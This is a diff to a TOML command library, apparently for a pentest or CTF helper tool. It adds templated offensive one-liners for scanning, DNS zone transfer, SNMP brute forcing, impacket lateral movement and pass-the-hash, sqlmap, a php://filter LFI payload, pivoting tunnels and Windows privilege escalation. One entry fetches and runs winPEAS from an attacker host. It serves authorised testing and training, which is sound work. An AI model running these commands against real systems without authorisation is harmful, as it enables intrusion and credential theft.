@@ -474,3 +474,326 @@ description = "whatweb + ffuf dirs — opens one run tab each"
 template = "whatweb <URL> ; ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200,301,302,403"
 tags = ["web", "playbook", "recon"]
 steps = ["whatweb <URL>", "ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200,301,302,403"]
+
+# ═════════════════════ expanded pack ═════════════════════
+# ── scanning ──
+[[command]]
+category = "nmap"
+name = "rustscan → nmap"
+description = "ultra-fast port find, pipe into nmap scripts"
+template = "rustscan -a <RHOST> --ulimit 5000 -- -sC -sV -oN nmap/rustscan.txt"
+tags = ["recon", "fast", "ports"]
+
+[[command]]
+category = "nmap"
+name = "masscan all"
+description = "all TCP ports at high rate (needs root)"
+template = "sudo masscan -p1-65535 <RHOST> --rate 1000 -e tun0"
+tags = ["recon", "fast"]
+
+# ── dns ──
+[[command]]
+category = "dns"
+name = "dig any"
+description = "all records for a domain"
+template = "dig any <DOMAIN> @<RHOST>"
+tags = ["dns", "enum"]
+
+[[command]]
+category = "dns"
+name = "zone transfer"
+description = "AXFR — dumps the whole zone if misconfigured"
+template = "dig axfr <DOMAIN> @<RHOST>"
+tags = ["dns", "axfr"]
+
+[[command]]
+category = "dns"
+name = "dnsrecon"
+description = "standard + brute DNS enumeration"
+template = "dnsrecon -d <DOMAIN> -n <RHOST> -t std,brt"
+tags = ["dns", "enum"]
+
+[[command]]
+category = "dns"
+name = "dnsenum"
+description = "enumerate + subdomain brute"
+template = "dnsenum --dnsserver <RHOST> <DOMAIN>"
+tags = ["dns", "enum"]
+
+# ── snmp ──
+[[command]]
+category = "snmp"
+name = "snmpwalk v2c"
+description = "walk the MIB tree with community 'public'"
+template = "snmpwalk -v2c -c public <RHOST>"
+tags = ["snmp", "enum"]
+
+[[command]]
+category = "snmp"
+name = "snmp-check"
+description = "formatted SNMP enumeration"
+template = "snmp-check <RHOST> -c public"
+tags = ["snmp", "enum"]
+
+[[command]]
+category = "snmp"
+name = "onesixtyone"
+description = "brute community strings"
+template = "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST>"
+tags = ["snmp", "brute"]
+
+# ── rpc ──
+[[command]]
+category = "rpc"
+name = "rpcclient null"
+description = "null-session RPC shell"
+template = "rpcclient -U '' -N <RHOST>"
+tags = ["rpc", "enum"]
+
+[[command]]
+category = "rpc"
+name = "enum domain users"
+description = "list users over RPC"
+template = "rpcclient -U '<USER>%<PASS>' <RHOST> -c 'enumdomusers'"
+tags = ["rpc", "ad", "users"]
+
+# ── db clients ──
+[[command]]
+category = "db"
+name = "mssql client"
+description = "impacket MSSQL (Windows auth)"
+template = "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<RHOST> -windows-auth"
+tags = ["db", "mssql"]
+
+[[command]]
+category = "db"
+name = "mysql"
+description = "connect to MySQL/MariaDB"
+template = "mysql -h <RHOST> -u <USER> -p'<PASS>'"
+tags = ["db", "mysql"]
+
+[[command]]
+category = "db"
+name = "psql"
+description = "connect to PostgreSQL"
+template = "PGPASSWORD='<PASS>' psql -h <RHOST> -U <USER>"
+tags = ["db", "postgres"]
+
+[[command]]
+category = "db"
+name = "redis-cli"
+description = "connect to Redis (often unauth)"
+template = "redis-cli -h <RHOST>"
+tags = ["db", "redis"]
+
+# ── ad exec / lateral ──
+[[command]]
+category = "ad"
+name = "wmiexec"
+description = "semi-interactive shell over WMI"
+template = "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<RHOST>"
+tags = ["ad", "exec", "lateral"]
+
+[[command]]
+category = "ad"
+name = "psexec"
+description = "SYSTEM shell via service (noisy)"
+template = "impacket-psexec <DOMAIN>/<USER>:<PASS>@<RHOST>"
+tags = ["ad", "exec"]
+
+[[command]]
+category = "ad"
+name = "pass-the-hash (wmiexec)"
+description = "auth with NTLM hash, no password"
+template = "impacket-wmiexec -hashes :<HASH> <DOMAIN>/<USER>@<RHOST>"
+tags = ["ad", "pth", "hash"]
+
+[[command]]
+category = "ad"
+name = "nxc smb spray"
+description = "netexec: validate creds across SMB"
+template = "nxc smb <RHOST> -u <USER> -p '<PASS>' --shares"
+tags = ["ad", "netexec", "spray"]
+
+# ── web attack ──
+[[command]]
+category = "web"
+name = "sqlmap"
+description = "automated SQLi on a request/URL"
+template = "sqlmap -u '<URL>' --batch --dbs"
+tags = ["web", "sqli"]
+
+[[command]]
+category = "web"
+name = "lfi php filter"
+description = "read source via base64 wrapper"
+template = "curl -s '<URL>?page=php://filter/convert.base64-encode/resource=index.php'"
+tags = ["web", "lfi"]
+
+[[command]]
+category = "web"
+name = "nuclei"
+description = "template-based vuln scan"
+template = "nuclei -u <URL>"
+tags = ["web", "scan"]
+
+# ── shells / transfer additions ──
+[[command]]
+category = "shells"
+name = "socat tty"
+description = "fully interactive TTY (listener + victim)"
+template = "socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>"
+tags = ["shell", "socat", "tty"]
+
+[[command]]
+category = "transfer"
+name = "certutil (win)"
+description = "download on Windows via certutil"
+template = "certutil -urlcache -f http://<LHOST>:<LPORT>/<FILE> <FILE>"
+tags = ["transfer", "windows"]
+
+[[command]]
+category = "transfer"
+name = "scp pull"
+description = "copy a remote file over SSH"
+template = "scp <USER>@<RHOST>:<FILE> ."
+tags = ["transfer", "ssh"]
+
+# ── tunnel ──
+[[command]]
+category = "tunnel"
+name = "ligolo proxy"
+description = "start ligolo-ng proxy (your box)"
+template = "ligolo-proxy -selfcert -laddr 0.0.0.0:<LPORT>"
+tags = ["tunnel", "pivot"]
+
+[[command]]
+category = "tunnel"
+name = "sshuttle"
+description = "route a subnet through SSH (VPN-like)"
+template = "sshuttle -r <USER>@<RHOST> 10.10.0.0/16"
+tags = ["tunnel", "pivot"]
+
+[[command]]
+category = "tunnel"
+name = "socat forward"
+description = "TCP port forward via socat"
+template = "socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>"
+tags = ["tunnel", "forward"]
+
+# ── forensics / stego ──
+[[command]]
+category = "forensics"
+name = "binwalk extract"
+description = "find + extract embedded files"
+template = "binwalk -e <FILE>"
+tags = ["forensics", "stego"]
+
+[[command]]
+category = "forensics"
+name = "steghide extract"
+description = "pull hidden data from an image/audio"
+template = "steghide extract -sf <FILE>"
+tags = ["forensics", "stego"]
+
+[[command]]
+category = "forensics"
+name = "exiftool"
+description = "read metadata"
+template = "exiftool <FILE>"
+tags = ["forensics", "metadata"]
+
+[[command]]
+category = "forensics"
+name = "strings + grep"
+description = "hunt flags/creds in a binary"
+template = "strings -n 6 <FILE> | grep -iE 'flag|pass|user|key'"
+tags = ["forensics", "strings"]
+
+[[command]]
+category = "forensics"
+name = "foremost carve"
+description = "carve files out of a blob/disk image"
+template = "foremost -i <FILE> -o foremost_out"
+tags = ["forensics", "carve"]
+
+# ── pwn / rev ──
+[[command]]
+category = "pwn"
+name = "checksec"
+description = "binary protections (NX/PIE/canary/RELRO)"
+template = "checksec --file=<FILE>"
+tags = ["pwn", "rev"]
+
+[[command]]
+category = "pwn"
+name = "pwntools template"
+description = "generate an exploit skeleton"
+template = "pwn template --host <RHOST> --port <RPORT> <FILE> > exploit.py"
+tags = ["pwn", "template"]
+
+[[command]]
+category = "pwn"
+name = "ltrace"
+description = "trace library calls"
+template = "ltrace ./<FILE>"
+tags = ["pwn", "rev", "trace"]
+
+[[command]]
+category = "pwn"
+name = "ropper gadgets"
+description = "search ROP gadgets"
+template = "ropper -f <FILE> --search 'pop rdi'"
+tags = ["pwn", "rop"]
+
+# ── windows privesc ──
+[[command]]
+category = "win"
+name = "winpeas pull+run"
+description = "fetch and run winPEASx64 (victim PowerShell)"
+template = "powershell -c \"iwr http://<LHOST>:<LPORT>/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe\""
+tags = ["privesc", "windows", "winpeas"]
+
+[[command]]
+category = "win"
+name = "whoami /priv"
+description = "token privileges (SeImpersonate etc)"
+template = "whoami /priv"
+tags = ["privesc", "windows"]
+
+[[command]]
+category = "win"
+name = "systeminfo"
+description = "OS/patch level for exploit matching"
+template = "systeminfo"
+tags = ["privesc", "windows"]
+
+[[command]]
+category = "win"
+name = "find flags (win)"
+description = "search user/root flags"
+template = "powershell -c \"Get-ChildItem -Path C:\\Users -Recurse -Include user.txt,root.txt -ErrorAction SilentlyContinue\""
+tags = ["windows", "flags"]
+
+# ── crack additions ──
+[[command]]
+category = "crack"
+name = "hashid"
+description = "identify a hash type"
+template = "hashid '<HASH>'"
+tags = ["crack", "identify"]
+
+[[command]]
+category = "crack"
+name = "zip2john"
+description = "extract hash from an encrypted zip"
+template = "zip2john <FILE> > zip.hash"
+tags = ["crack", "john", "zip"]
+
+# ── misc / gtfobins ──
+[[command]]
+category = "misc"
+name = "gtfobins hint"
+description = "reminder — check GTFOBins for a sudo/SUID binary"
+template = "echo 'https://gtfobins.github.io/#<FILE>'"
+tags = ["privesc", "gtfobins", "reference"]
